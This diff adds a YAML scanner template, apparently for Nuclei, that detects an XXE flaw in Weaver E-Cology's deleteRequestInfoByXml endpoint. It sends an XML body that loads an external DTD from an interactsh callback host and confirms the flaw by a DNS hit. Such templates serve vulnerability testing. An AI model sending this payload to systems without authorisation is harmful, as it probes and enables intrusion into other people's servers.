@@ -1,0 +1,21 @@
+id: poc-yaml-e-cology-deleterequestInfobyxml-xxe
+info:
+  name: 泛微E-Cology系统接口deleteRequestInfoByXml存在XXE漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: DNSLOG,xxe
+http:
+  - method: POST
+    path:
+      - "/rest/ofs/deleteRequestInfoByXml"
+    headers:
+      Content-Type: application/xml
+    body: |
+      <?xml version="1.0" encoding="utf-8"?>
+      <!DOCTYPE syscode SYSTEM "http://{{interactsh-url}}">
+      <M><syscode>&send;</syscode></M>
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
